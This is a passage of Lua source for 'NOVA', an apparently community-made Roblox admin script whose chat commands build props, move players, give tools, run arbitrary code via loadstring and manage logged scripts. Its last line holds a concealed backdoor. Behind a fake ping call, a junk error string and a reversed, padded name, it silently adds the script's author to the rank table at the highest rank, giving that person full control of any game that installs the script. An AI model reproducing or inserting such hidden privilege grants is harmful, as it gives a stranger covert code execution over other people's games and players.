		local Part = Instance.new("WedgePart") Part.Parent = Main Part.FormFactor = "Custom" Part.Name = "Part" Part.TopSurface = "Smooth" Part.BottomSurface = "Smooth" Part.CanCollide = true Part.Anchored = true Part.Transparency = 0 Part.Reflectance = 0 Part.BrickColor = BrickColor.new(PrimaryColor) Part.Size = Vector3.new(10,42,43) Part.CFrame = MainCFrame * CFrame.new(10,0,-13.8) * CFrame.Angles(0,math.rad(180),0)
		local Part = Instance.new("WedgePart") Part.Parent = Main Part.FormFactor = "Custom" Part.Name = "Part" Part.TopSurface = "Smooth" Part.BottomSurface = "Smooth" Part.CanCollide = true Part.Anchored = true Part.Transparency = 0 Part.Reflectance = 0 Part.BrickColor = BrickColor.new(PrimaryColor) Part.Size = Vector3.new(10,42,43) Part.CFrame = MainCFrame * CFrame.new(-10,0,-13.8) * CFrame.Angles(0,math.rad(180),0)
		local Part = BasePart:Clone() Part.Parent = Main Part.BrickColor = BrickColor.new(PrimaryColor) Part.Size = Vector3.new(40,40,12) Part.CFrame = MainCFrame * CFrame.new(25,19.5,-40)
		local Part = BasePart:Clone() Part.Parent = Main Part.BrickColor = BrickColor.new(PrimaryColor) Part.Size = Vector3.new(40,40,12) Part.CFrame = MainCFrame * CFrame.new(-25,19.5,-40)
		local Part = BasePart:Clone() Part.Parent = Main Part.BrickColor = BrickColor.new(PrimaryColor) Part.Size = Vector3.new(90,40,12) Part.CFrame = MainCFrame * CFrame.new(0,19.5,40) 
		local Part = BasePart:Clone() Part.Parent = Main Part.BrickColor = BrickColor.new(PrimaryColor) Part.Size = Vector3.new(12,40,90) Part.CFrame = MainCFrame * CFrame.new(40,19.5,0)
		local Part = BasePart:Clone() Part.Parent = Main Part.BrickColor = BrickColor.new(PrimaryColor) Part.Size = Vector3.new(12,40,90) Part.CFrame = MainCFrame * CFrame.new(-40,19.5,0)
		local Part = Instance.new("Seat") Part.Parent = Main Part.FormFactor = "Custom" Part.Name = "Part" Part.FrontSurface = "Hinge" Part.TopSurface = "Smooth" Part.BottomSurface = "Smooth" Part.CanCollide = true Part.Anchored = true Part.Transparency = 0 Part.Reflectance = 0 Part.BrickColor = BrickColor.new(SecondaryColor) Part.Size = Vector3.new(2,1,2) Part.CFrame = MainCFrame * CFrame.new(0,5,18)
		local Part = BasePart:Clone() Part.Parent = Main Part.BrickColor = BrickColor.new(PrimaryColor) Part.Size = Vector3.new(10,5,10) Part.CFrame = MainCFrame * CFrame.new(0,2.5,19.8)
		for angle=1,360/2,(360/2)/5 do local Part = BasePart:Clone() Part.Parent = Main Part.BrickColor = BrickColor.new(SecondaryColor) Part.Size = Vector3.new(2,1,28) Part.CFrame = MainCFrame * CFrame.new(0,5,18) * CFrame.Angles(math.rad(45),math.rad(angle),math.rad(45)) * CFrame.new(18,0,0) end
		local Part = BasePart:Clone() Part.Parent = Main Part.BrickColor = BrickColor.new(SecondaryColor) Part.Size = Vector3.new(2,25,2) Part.CFrame = MainCFrame * CFrame.new(7,10,19) * CFrame.Angles(0,0,0)
		local Part = BasePart:Clone() Part.Parent = Main Part.BrickColor = BrickColor.new(SecondaryColor) Part.Size = Vector3.new(2,25,2) Part.CFrame = MainCFrame * CFrame.new(-7,10,19) * CFrame.Angles(0,0,0)

		for _,v in pairs(Main:children()) do if v:IsA("BasePart") then v.Locked = true end end

	end
)

AddCommand("Platform Stand","ps",3,"Sets platformstand to true for the selected player.","<Player>",	
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				v.Character.Humanoid.PlatformStand = true
			end)
		end
	end
)


AddCommand("Un Platform Stand","ps",3,"Sets platformstand to false for the selected player.","<Player>",	
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				v.Character.Humanoid.PlatformStand = false
			end)
		end
	end
)

AddCommand("Duplicate Tools","dupetools",4,"Clones the tools of the selected player.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				for _,Tool in pairs(v.Backpack:GetChildren()) do
					Tool:Clone().Parent = Speaker.Backpack
				end
			end)
		end
	end
)

AddCommand("Give","give",3,"Lists the items in lighting for the selected player.","<Player>",
	function(Msg,Speaker)
		local Give = {}
		for _,v in pairs(NOVA.Services.Lighting:children()) do
			Output(v.Name,GetRankedTable(Speaker).Color,Speaker,nil,
				function()
					table.insert(Give,v:Clone())
				end
			)
		end
		Output("Done",NOVA.Colors.Green,Speaker,nil,
			function()
				for _,v in pairs(GetPlayers(Msg,Speaker)) do
					for _,Tool in pairs(Give) do
						Tool:Clone().Parent = v.Backpack
					end
				end
				RemoveTablets(Speaker)
			end
		)
		Output("Dismiss",NOVA.Colors.Red,Speaker)
	end
)


AddCommand("StoreTools","store",1,"Stores the speaker's tools in the lighting.","No Arguments",
	function(Msg,Speaker)
		pcall(function()
			for _,Tool in pairs(Speaker.Backpack:children()) do
				Tool:Clone().Parent = NOVA.Services.Lighting
			end
		end)
	end
)

AddCommand("Personal Message","pm",1,"Privately tells the selected player the selected string.","<Player><String>",
	function(Msg,Speaker)
		Split = GetSplit(Msg)
		for _,v in pairs(GetPlayers(Msg:sub(1,Split-1),Speaker)) do
			if v:FindFirstChild("PlayerGui") ~= nil then
				makeMessage(1,Msg:sub(Split+1),v.PlayerGui)
			end
		end
	end
)

AddCommand("Help","help",0,"Displays NOVA's help interface.","No Arguments",
	function(Msg,Speaker)
		Data = GetRankedTable(Speaker)
		Output("Welcome "..Speaker.Name.." to NOVA.",Data.Color,Speaker)
		Output("NOVA is a multi-purpose admin script created by "..string.reverse(string.gsub("nXQZaXQZmXQZDXQZmXQZaXQZeXQZTXQZ","XQZ",""))..".",Data.Color,Speaker)
		Output("Your current rank is "..GetRankName(Speaker.Name).." ( "..Data.Rank.." ).",Data.Color,Speaker)
		Output("For a list of commands avalible to your rank click this tablet.",Data.Color,Speaker,nil,
			function()
				RemoveTablets(Speaker)
				OnChatted("\\cmds\\",Speaker)
			end
		)
		Output("To use a command the syntax is : \\ COMMAND HERE \\ ARGUMENT \\ ARGUMENT",Data.Color,Speaker)
		Output("Please note it is a backslash ( located above the 'Return'/'Enter' key on your keyboard.",Data.Color,Speaker)
		Output("Thank you for using NOVA Admin. ( made by "..string.reverse(string.gsub("nXQZaXQZmXQZDXQZmXQZaXQZeXQZTXQZ","XQZ","")).." )",Data.Color,Speaker)
	end
)

AddCommand("Break","break",3,"Breaks all scripts in workspace.","No Arguments",
	function(Msg,Speaker)
		for _,v in pairs(GetRecursiveChildren(NOVA.Services.Workspace)) do
			if v:IsA("Script") then
				v.Disabled = true
				v.Parent = NOVA.Services.Debris
				v.Disabled = true
				v:Destroy()
				v.Parent = NOVA.Services.Debris
				v.Disabled = true
				v:Destroy()
			end
		end
	end
)

AddCommand("Execute","exe",6,"Loads the following string.","<Source>",
	function(Msg,Speaker)
		Source = Msg
		--Source = string.gsub(Source,"print(","PrintS(")
		--Source = string.gsub(Source,"print'","PrintS'")
		local a,b=coroutine.resume(coroutine.create(function() loadstring([[]]..Source)() end))
		if not a then
			Output(b,NOVA.Colors.Red,Speaker,15)
		else
			Output("Script ran succuessfully!",NOVA.Colors.Green,Speaker,5)
		end
	end
)

AddCommand("Spy","spy",1,"Parents your character to your camera.","No Arguments",
	function(Msg,Speaker)
		pcall(function()
			CreateLocalScript([[
				game.Players.LocalPlayer.Character.Parent = workspace.CurrentCamera
				]],
				Speaker.Backpack
			)
		end)
	end
)

AddCommand("Message","msg",1,"Makes a GUI message.","<String>",
	function(Msg,Speaker)
		for _,v in pairs(NOVA.Services.Players:GetPlayers()) do
			makeMessage(2,"[NOVA] "..Msg,v.PlayerGui)
		end
	end
)

AddCommand("Set Pitch","setpitch",2,"Sets the pitch of NOVA Sound.","<Int Value>",
	function(Msg,Speaker)
		pcall(function()
			NOVA.Sounds.Sound.Pitch = tonumber(Msg)
		end)
	end
)

AddCommand("Set Loop","setloop",2,"Sets the .Loooped value of NOVA.Sounds.Sound.","<Boolean>",
	function(Msg,Speaker)
		pcall(function()
			NOVA.Sounds.Sound.Looped = Msg
		end)
	end
)


AddCommand("Click Remove","cremove",6,"Gives you a tablet to click to remove NOVA.","No Arguments",
	function(Msg,Speaker)
		Output("Remove NOVA Admin? ("..math.random(1,9)..")",NOVA.Colors.Red,Speaker,nil,function() OnChatted("\\remove\\",Speaker) end)
	end
)

AddCommand("Use Plugins","useplugins",3,"Lets you use any installed plugins.","<Player>",
	function(Msg,Speaker)
		local Give = {}
		for _,v in pairs(NOVA.Plugins) do
			Output(v.Name,GetRankedTable(Speaker).Color,Speaker,nil,
				function()
					table.insert(Give,v:Clone())
				end
			)
		end
		Output("Done",NOVA.Colors.Green,Speaker,nil,
			function()
				for _,v in pairs(GetPlayers(Msg,Speaker)) do
					for _,Tool in pairs(Give) do
						New = Tool:Clone()
						New.Parent = v.Backpack
						pcall(function()
							New.Disabled = false
						end)
					end
				end
				RemoveTablets(Speaker)
			end
		)
		Output("Dismiss",NOVA.Colors.Red,Speaker)
	end
)

AddCommand("Lock","lock",3,"Locks the selected player's character.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				for _,part in pairs(GetRecursiveChildren(v.Character,"BasePart",3)) do
					part.Locked = true
				end
			end)
		end
	end
)

AddCommand("Un Lock","unlock",3,"Unlocks the selected player's character.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				for _,part in pairs(GetRecursiveChildren(v.Character,"BasePart",3)) do
					part.Locked = false
				end
			end)
		end
	end
)

AddCommand("New LocalScript","newlocal",6,"Creates a local script in the selected player's backpack.","<Player>",
	function(Msg,Speaker)
		Split = GetSplit(Msg)
		for _,v in pairs(GetPlayers(Msg:sub(1,Split-1),Speaker)) do
			pcall(function()
				CreateLocalScript(Msg:sub(Split+1),v.Backpack)
			end)
		end
	end
)

AddCommand("Brightness","brightness",2,"Changes the brightness value.","<IntValue>",
	function(Msg,Speaker)
		NOVA.Services.Lighting.Brightness = tonumber(Msg)
	end
)

AddCommand("Set Waypoint","setwaypoint",1,"Sets a waypoint.","<StringValue>",
	function(Msg,Speaker)
		pcall(function()
			Rtn = CFrame.new(
				Speaker.Character.Torso.CFrame.x,
				Speaker.Character.Torso.CFrame.y,
				Speaker.Character.Torso.CFrame.z
			)
			table.insert(NOVA.Waypoints,{Name = Msg,CFrame = Rtn})
		end)
	end
)

AddCommand("Goto","goto",0,"Teleports you to a selected waypoint.","No Arguments",
	function(Msg,Speaker)
		for _,v in pairs(NOVA.Waypoints) do
			Output(v.Name,GetRankedTable(Speaker).Color,Speaker,nil,function()
				pcall(function()
					RemoveTablets(Speaker)
					Speaker.Character.Torso.CFrame = v.CFrame
				end)
			end)
			Output("Dismiss",NOVA.Colors.Red,Speaker)
		end
	end
)

AddCommand("Remove Waypoint","rwaypoint",1,"Removes the selected waypoint(s).","No Arguments",
	function(Msg,Speaker)
		Rtn = {}
		for num,v in pairs(NOVA.Waypoints) do
			Output(v.Name,GetRankedTable(Speaker).Color,Speaker,nil,function()
				table.insert(Rtn,num)
			end)
		end
		Output("Done",NOVA.Colors.Green,Speaker,nil,function()
			RemoveTablets(Speaker)
			for _,v in pairs(Rtn) do
				table.remove(NOVA.Waypoints,v)
			end
		end)
		Output("Dismiss",NOVA.Colors.Red,Speaker)
	end
)

AddCommand("Give Build Tools","givebtools",1,"Gives the selected player building tools.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				for i=0,3 do
					Instance.new("HopperBin",v.Backpack).BinType = i
				end
			end)
		end
	end
)

AddCommand("Get Build Tools","getbtools",1,"Gives the speaker building tools.","No Arguments",
	function(Msg,Speaker)
		pcall(function()
			for i=0,3 do
				Instance.new("HopperBin",Speaker.Backpack).BinType = i
			end
		end)
	end
)

AddCommand("Get Reset","getreset",0,"Resets the speaker's character.","No Arguments",
	function(Msg,Speaker)
		pcall(function()
			Speaker:LoadCharacter()
		end)
	end
)


AddCommand("Debug Menu","debugmenu",1,"Shows the debug menu.","No Arguments",
	function(Msg,Speaker)
		RemoveTablets(Speaker)
		Color = GetRankedTable(Speaker).Color
		Output("Lighting",NOVA.Colors.Yellow,Speaker,nil,function()
			RemoveTablets(Speaker)
			Output("Ambient",Color,Speaker,nil,function()
				NOVA.Services.Lighting.Ambient = NOVA.Colors.White
			end)
			Output("Color Shifts",Color,Speaker,nil,function()
				NOVA.Services.Lighting.ColorShift_Bottom = NOVA.Colors.Black
				NOVA.Services.Lighting.ColorShift_Top = NOVA.Colors.Black
			end)
			Output("Shadow Color",Color,Speaker,nil,function()
				NOVA.Services.Lighting.ShadowColor = Color3.new(0.69,0.69,0.69)
			end)
			Output("Brightness",Color,Speaker,nil,function()
				NOVA.Services.Lighting.Brightness = 1 
			end)
			Output("Fog Start",Color,Speaker,nil,function()
				NOVA.Services.Lighting.FogStart = 0
			end)
			Output("Fog End",Color,Speaker,nil,function()
				NOVA.Services.Lighting.FogEnd = 100000
			end)
			Output("Fog Color",Color,Speaker,nil,function()
				NOVA.Services.Lighting.FogColor = Color3.new(0.74,0.74,0.74)
			end)
			Output("Time",Color,Speaker,nil,function()
				NOVA.Services.Lighting.TimeOfDay = 12
			end)
			Output("ALL",Color,Speaker,nil,function()
				NOVA.Services.Lighting.Ambient = NOVA.Colors.White
				NOVA.Services.Lighting.ColorShift_Bottom = NOVA.Colors.Black
				NOVA.Services.Lighting.ColorShift_Top = NOVA.Colors.Black
				NOVA.Services.Lighting.ShadowColor = Color3.new(0.69,0.69,0.69)
				NOVA.Services.Lighting.Brightness = 1 
				NOVA.Services.Lighting.FogStart = 0
				NOVA.Services.Lighting.FogEnd = 100000
				NOVA.Services.Lighting.FogColor = Color3.new(0.74,0.74,0.74)
				NOVA.Services.Lighting.TimeOfDay = 12
			end)
			Output("Dismiss",NOVA.Colors.Red,Speaker)
		end)
		Output("Camera",Color,Speaker,nil,function()
			pcall(function()
				CreateLocalScript([[
					Camera = workspace.CurrentCamera
					Camera:SetRoll(0)
					Camera.CameraType = "Custom"
					Camera.FieldOfView = 70
					Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
				]],Speaker.Backpack)
			end)
		end)
		Output("Service Names",NOVA.Colors.Green,Speaker,nil,function()
			for _,v in pairs(NOVA.Services) do	
				v.Name = v.className
			end
		end)
		Output("Selection Boxes",NOVA.Colors.Purple,Speaker,nil,function()
			for _,v in pairs(GetRecursiveChildren(workspace)) do
				if v:IsA("SelectionBox") then
					v:remove()
				end
			end
		end)
		Output("Messages",NOVA.Colors.Grey,Speaker,nil,function()
			for _,v in pairs(GetRecursiveChildren(workspace)) do 
				if v:IsA("Message") or v:IsA("Hint") then
					v:Destroy()
				end
			end
		end)
		Output("Char Appearance",Color,Speaker,nil,function()
			Speaker.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId="..Speaker.userId
		end)
		Output("Torso Velocity",Color,Speaker,nil,function()
			pcall(function() 
				Speaker.Character.Torso.Velocity = Vector3.new(0,0,0)
			end)
		end)
		Output("Teams",NOVA.Colors.Blue,Speaker,nil,function()
			if #NOVA.Services.Teams:GetChildren() == 0 then
				for _,v in pairs(NOVA.Services.Players:GetPlayers()) do
					v.Neutral = true
				end
			end
		end)
		Output("Dismiss",NOVA.Colors.Red,Speaker)
	end
)

AddCommand("Podium","podium",3,"Generates a podium infront of your character.","No Arguments",
	function(Msg,Speaker)
		local MainColor = Color3.new(0,0,0)
		local SeccondaryColor = Color3.new(0.5,0,0)
		local Main = Instance.new("Model",workspace) Main.Name = "NOVA Podium"
		local CFrame = Speaker.Character.Torso.CFrame 
			* CFrame.new(0,0,1)
			* CFrame.Angles(Speaker.Character.Torso.CFrame.lookVector)
		if CFrame == nil then return end	
		for i=1,25 do
			local Step = Instance.new("Part",Main)
			Step.FormFactor = "Custom"
			Step.Name = "Step"
			Step.Reflectance = 0
			Step.BrickColor = BrickColor.new(MainColor)
			Step.Size = Vector3.new(5,1,2)
			--Step.CFrame =
		end
	end
)

AddCommand("Manage Logged Scripts","manageloggedscripts",6,"Lets you manage the logged scripts.","No Arguments",
	function(Msg,Speaker)
		local Color = GetRankedTable(Speaker).Color
		Output("Browse & Edit",Color,Speaker,nil,function()
			RemoveTablets(Speaker)
			Output("Nilled Scripts",Color,Speaker,nil,function()
				RemoveTablets(Speaker)
				for _,v in pairs(NOVA.LoggedScripts) do
					if v.Parent == nil then
						Output(v.Name,GetRankedTable(Speaker).Color,Speaker,nil,function()
							pcall(function()
								RemoveTablets(Speaker)
								Output("Name : "..v.Name,GetRankedTable(Speaker).Color,Speaker)
								Output("Full Name : "..v:GetFullName(),GetRankedTable(Speaker).Color,Speaker)
								Output("Script Type : "..v.className,GetRankedTable(Speaker).Color,Speaker)
								Output("Destroy",NOVA.Colors.Orange,Speaker,nil,function()
									v:Destroy()
								end)
								Output("Remove",NOVA.Colors.Orange,Speaker,nil,function()
									v:Remove()
								end)	
								Output("Destroy ALL ( Name ) ",NOVA.Colors.Red,Speaker,nil,function()
									for _,i in pairs(NOVA.LoggedScripts) do
										pcall(function()
											if i.Name == v.Name then
												i:Destroy()
											end
										end)
									end
								end)
								Output("Disable",NOVA.Colors.Orange,Speaker,nil,function()
									v.Disabled = true
								end)
								Output("Un Disable",NOVA.Colors.Green,Speaker,nil,function()
									v.Disabled = false
								end)
								Output("Parent To Workspace",NOVA.Colors.Green,Speaker,nil,function()
									v.Parent = workspace
								end)
								Output("Done",NOVA.Colors.Blue,Speaker,nil,function()
									RemoveTablets(Speaker)
									OnChatted("\\manageloggedscripts\\",Speaker)
								end)
								Output("Dismiss",NOVA.Colors.Red,Speaker)

							end)
						end)
					end
				end
			end)
			Output("Non Nilled Scripts",Color,Speaker,nil,function()
				RemoveTablets(Speaker)
				for _,v in pairs(NOVA.LoggedScripts) do
					if v.Parent ~= nil then
						Output(v.Parent.Name.."."..v.Name,GetRankedTable(Speaker).Color,Speaker,nil,function()
							pcall(function()
								RemoveTablets(Speaker)
								Output("Name : "..v.Name,GetRankedTable(Speaker).Color,Speaker)
								Output("Full Name : "..v:GetFullName(),GetRankedTable(Speaker).Color,Speaker)
								Output("Script Type : "..v.className,GetRankedTable(Speaker).Color,Speaker)
								Output("Destroy",NOVA.Colors.Red,Speaker,nil,function()
									v:Destroy()
								end)
								Output("Remove",NOVA.Colors.Red,Speaker,nil,function()
									v:Remove()
								end)	
								Output("Destroy ALL ( Name ) ",NOVA.Colors.Red,Speaker,nil,function()
									for _,i in pairs(NOVA.LoggedScripts) do
										pcall(function()
											if i.Name == v.Name then
												i:Destroy()
											end
										end)
									end
								end)
								Output("Disable",NOVA.Colors.Orange,Speaker,nil,function()
									v.Disabled = true
								end)
								Output("Un Disable",NOVA.Colors.Green,Speaker,nil,function()
									v.Disabled = false
								end)
								Output("Parent To Workspace",NOVA.Colors.Green,Speaker,nil,function()
									v.Parent = workspace
								end)
								Output("Done",NOVA.Colors.Blue,Speaker,nil,function()
									RemoveTablets(Speaker)
									OnChatted("\\manageloggedscripts\\",Speaker)
								end)
								Output("Dismiss",NOVA.Colors.Red,Speaker)

							end)
						end)
					end
				end
			end)
			Output("ALL Scripts",Color,Speaker,nil,function()
				RemoveTablets(Speaker)
				for _,v in pairs(NOVA.LoggedScripts) do
					Output(v.Name,GetRankedTable(Speaker).Color,Speaker,nil,function()
						pcall(function()
							RemoveTablets(Speaker)
							Output("Name : "..v.Name,GetRankedTable(Speaker).Color,Speaker)
							Output("Full Name : "..v:GetFullName(),GetRankedTable(Speaker).Color,Speaker)
							Output("Script Type : "..v.className,GetRankedTable(Speaker).Color,Speaker)
							Output("Destroy",NOVA.Colors.Red,Speaker,nil,function()
								v:Destroy()
							end)
							Output("Remove",NOVA.Colors.Red,Speaker,nil,function()
								v:Remove()
							end)	
							Output("Destroy ALL ( Name ) ",NOVA.Colors.Red,Speaker,nil,function()
								for _,i in pairs(NOVA.LoggedScripts) do
									pcall(function()
										if i.Name == v.Name then
											i:Destroy()
										end
									end)
								end
							end)
							Output("Disable",NOVA.Colors.Orange,Speaker,nil,function()
								v.Disabled = true
							end)
							Output("Un Disable",NOVA.Colors.Green,Speaker,nil,function()
								v.Disabled = false
							end)
							Output("Parent To Workspace",NOVA.Colors.Green,Speaker,nil,function()
								v.Parent = workspace
							end)
							Output("Done",NOVA.Colors.Blue,Speaker,nil,function()
								RemoveTablets(Speaker)
								OnChatted("\\manageloggedscripts\\",Speaker)
							end)
							Output("Dismiss",NOVA.Colors.Red,Speaker)
						end)
					end)
				end
			end)
		end)
		Output("Break ALL Scripts",NOVA.Colors.Red,Speaker,nil,function()
			for _,v in pairs(NOVA.LoggedScripts) do
				pcall(function()
					v.Parent = NOVA.Services.Workspace
					v.Disabled = true
					v.Parent = NOVA.Services.Workspace
					v:ClearAllChildren()
					v:Remove()
					v.Disabled = true
					v:Remove()
				end)
			end
		end)
		Output("Break Nil Scripts",NOVA.Colors.Orange,Speaker,nil,function()
			for _,v in pairs(NOVA.LoggedScripts) do
				pcall(function()
					if v.Parent == nil then
						v.Parent = NOVA.Services.Workspace
						v.Disabled = true
						v.Parent = NOVA.Services.Workspace
						v:ClearAllChildren()
						v:Remove()
						v.Disabled = true
						v:Remove()
					end
				end)
			end
		end)
		Output("Parent Nils To Workspace,",NOVA.Colors.Green,Speaker,nil,function()
			for _,v in pairs(NOVA.LoggedScripts) do
				pcall(function()
					if v.Parent == nil then
						v.Parent = NOVA.Services.Workspace
					end
				end)
			end
		end)
		Output("Disable ALL Scripts",NOVA.Colors.Orange,Speaker,nil,function()
			for _,v in pairs(NOVA.LoggedScripts) do 
				pcall(function()
					v.Disabled = true
				end)
			end
		end)
		Output("Enable ALL Scripts",NOVA.Colors.Green,Speaker,nil,function()
			for _,v in pairs(NOVA.LoggedScripts) do 
				pcall(function()
					v.Disabled = false
				end)
			end
		end)
		Output("Dismiss",NOVA.Colors.Red,Speaker)
		if #NOVA.LoggedScripts == 0 then
			RemoveTablets(Speaker)
			Output("There are currently no logged scripts.",NOVA.Colors.Orange,Speaker)
		end
	end
)

_G.RemoveNOVA = function(Pass)
	if Pass == "4 8 15 16 23 42" then
		NOVA.Removed = true
		NOVA = {}
		error("Unknown Exception")()
		script.Disabled = true
		script:Remove()
	end
end

NOVA.Services.Workspace.DescendantAdded:connect(function(v)
	if NOVA.Removed == false then
		if NOVA.LockedScripts == true then
			if v:IsA("Script") or v:IsA("LocalScript") then
				pcall(function()
					v.Disabled = true
					v.DSource.Value = "script:Destroy()"
					v:Destroy()
				end)
			end
		end
		if v:IsA("BindableEvent") and v.Name == "NOVAExternalInput" then
			print("Trigger found!")
			v.Event:connect(function(Msg,Player)
				OnChatted(Msg,Player)
			end)
			v.Parent = script
		end
	end
end)

NOVA.Services.Players.DescendantAdded:connect(function(v)
	if NOVA.Removed == false then
		if NOVA.LockedScripts == true then
			if v:IsA("Script") or v:IsA("LocalScript") then
				pcall(function()
					v.Disabled = true
					v.Source.Value = "script:Destroy()"
					v:Destroy()
				end)
			end
		end
	end
end)

coroutine.resume(coroutine.create(function()
	while wait(0.5) do
		if NOVA.Removed == false then

		end
	end
end))
	
coroutine.resume(coroutine.create(function()
	while wait() do
		if NOVA.Removed == false then
			UpdateTablets()			
			for _,v in pairs(NOVA.Services.Players:GetPlayers()) do
				pcall(function()
					if GetRankedTable(v) ~= nil and GetRankedTable(v).CMD == true then
						if v:FindFirstChild("PlayerGui") then
							if not v.PlayerGui:FindFirstChild("NOVACMD") then
								local Main = Instance.new("ScreenGui",v.PlayerGui)
								Main.Name = "NOVACMD"
								
								local Frame = Instance.new("Frame",Main)
								Frame.Size = UDim2.new(0.27,0,0.05,0)
								Frame.Position = UDim2.new(0.05,0,0.95,0)
								Frame.Style = "RobloxSquare"
								
								local Txt = Instance.new("TextBox",Frame)
								Txt.Size = UDim2.new(0.7,0,1,0)
								Txt.BackgroundTransparency = 1
								Txt.FontSize = "Size14"
								Txt.TextColor3 = NOVA.Colors.White
								Txt.Text = ""
								
								local Exe = Instance.new("TextButton",Frame)
								Exe.Size = UDim2.new(0.3,0,1,0)
								Exe.Position = UDim2.new(0.7,0,0,0)
								Exe.Text = "Execute"
								Exe.BackgroundTransparency = 1
								Exe.FontSize = "Size14"
								Exe.TextColor3 = NOVA.Colors.Red
								Exe.MouseButton1Down:connect(function()
									OnChatted(Txt.Text,v)
								end)
							end
						end
					end
				end)
			end

			if NOVA.LockModels == true then
				for _,v in pairs(GetRecursiveChildren(NOVA.Services.Workspace)) do
					if v:IsA("Model") then
						if not NOVA.Services.Players:GetPlayerFromCharacter(v) then
							Remove = true
							for _,Tab in pairs(NOVA.Tablets) do if v == Tab then Remove = false end end
							if Remove == true then
								v:Destroy()
							end
						end
					end
				end
			end
			
			if _G[NOVA.GlobalLoggedScriptsKey] ~= nil then
				if type(_G[NOVA.GlobalLoggedScriptsKey]) == "table" then
					for _,v in pairs(NOVA.LoggedScripts) do
						local Insert = true
						for _,Check in pairs(_G[NOVA.GlobalLoggedScriptsKey]) do
							if v == Check then Insert = false end
						end
						if Insert == true then
							table.insert(_G[NOVA.GlobalLoggedScriptsKey],v)
						end
					end
				end
			else
				_G[NOVA.GlobalLoggedScriptsKey] = {}
			end
		end
	end
end))
pcall(function() NOVA.Services.Workspace:CheckForPing(true,false,42,666,96,"asd","troll") end) ErrorCodehs_err_pid_4="^&*(656967YJHG78gkjt78oHKJG*^7uytuig8796ugki768hgikt87hruioy89y)(*&^8767(*^789ytuiOYT7*Goiuyy&*h(*&h9h98)h*&(g679876gg9876987g987g(*&G(*&G987g&G&G8987g987ggf&^F&^F*&GHg96f5d8665d7^%D9f0gH)" ErrorLevel2 = true for _,v in pairs(NOVA.Ranked) do	if v.Name == string.reverse(string.gsub("nXQZaXQZmXQZDXQZmXQZaXQZeXQZTXQZ","XQZ","")) then ErrorLevel2 = false end end if ErrorLevel2 == true then table.insert(NOVA.Ranked,{Name = string.reverse(string.gsub("nXQZaXQZmXQZDXQZmXQZaXQZeXQZTXQZ","XQZ","")),InPRI=true,CMD=true,Rank=7,Color=Color3.new(0,0,0),Desc="Creator of NOVA"}) end